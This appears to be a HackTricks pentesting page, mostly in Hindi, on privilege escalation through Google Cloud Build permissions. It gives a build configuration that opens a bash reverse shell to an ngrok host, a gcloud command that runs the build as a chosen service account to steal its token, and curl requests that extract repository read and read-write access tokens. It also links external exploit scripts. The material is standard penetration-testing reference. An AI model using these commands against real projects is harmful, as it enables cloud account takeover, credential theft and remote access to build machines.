# GCP - Cloudbuild Privesc

{{#include ../../../banners/hacktricks-training.md}}

## cloudbuild

Cloud Build के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
../gcp-services/gcp-cloud-build-enum.md
{{#endref}}

### `cloudbuild.builds.create`, `iam.serviceAccounts.actAs`

इस अनुमति के साथ आप एक Cloud Build सबमिट कर सकते हैं। cloudbuild मशीन की फ़ाइल सिस्टम में डिफ़ॉल्ट रूप से cloudbuild Service Account का token होगा: `<PROJECT_NUMBER>@cloudbuild.gserviceaccount.com`। हालाँकि, आप cloudbuild configuration में प्रोजेक्ट के अंदर किसी भी service account को इंगित कर सकते हैं।\
इसलिए, आप बस मशीन से token को अपने सर्वर पर exfiltrate करवा सकते हैं या उसके अंदर reverse shell लेकर खुद token प्राप्त कर सकते हैं (टोकन वाला फ़ाइल बदल सकती है)।

#### Direct exploitation via gcloud CLI

1- `cloudbuild.yaml` बनाएं और इसे अपने listener data के साथ संशोधित करें

<details><summary>Cloud Build YAML configuration for reverse shell</summary>
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/14965 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
</details>

2- स्रोत के बिना एक सरल build अपलोड करें, yaml फ़ाइल दें और build पर उपयोग करने के लिए SA निर्दिष्ट करें:

<details><summary>निर्दिष्ट service account के साथ Cloud Build सबमिट करें</summary>
```bash
gcloud builds submit --no-source --config="./cloudbuild.yaml" --service-account="projects/<PROJECT>/serviceAccounts/<SERVICE_ACCOUNT_ID>@<PROJECT_ID>.iam.gserviceaccount.com
```
</details>

#### python gcloud library का उपयोग
You can find the original exploit script [**here on GitHub**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudbuild.builds.create.py) (but the location it's taking the token from didn't work for me). Therefore, check a script to automate the [**creation, exploit and cleaning of a vuln environment here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/f-cloudbuild.builds.create.sh) and a python script to get a reverse shell inside the cloudbuild machine and [**steal it here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/f-cloudbuild.builds.create.py) (code में आप देख सकते हैं कि अन्य service accounts कैसे निर्दिष्ट किए जाते हैं)**.**

अधिक गहन व्याख्या के लिए, देखें [https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/](https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/)


### `cloudbuild.repositories.accessReadToken`

इस permission के साथ user repository तक पहुँचने के लिए उपयोग किए जाने वाले **read access token** प्राप्त कर सकता है:

<details><summary>repository के लिए read access token प्राप्त करें</summary>
```bash
curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
-d '{}' \
"https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>/repositories/<repo-id>:accessReadToken"
```
</details>

### `cloudbuild.repositories.accessReadWriteToken`

इस अनुमति के साथ उपयोगकर्ता रिपॉज़िटरी तक पहुँचने के लिए उपयोग किए जाने वाले **read and write access token** को प्राप्त कर सकता है:

<details><summary>रिपॉज़िटरी के लिए read and write access token प्राप्त करें</summary>
```bash
curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
-d '{}' \
"https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>/repositories/<repo-id>:accessReadWriteToken"
```
</details>

### `cloudbuild.connections.fetchLinkableRepositories`

इस अनुमति के साथ आप **उन repos को प्राप्त कर सकते हैं जिन तक connection की पहुँच है:**

<details><summary>लिंक करने योग्य repos प्राप्त करें</summary>
```bash
curl -X GET \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
"https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>:fetchLinkableRepositories"
```
</details>

{{#include ../../../banners/hacktricks-training.md}}
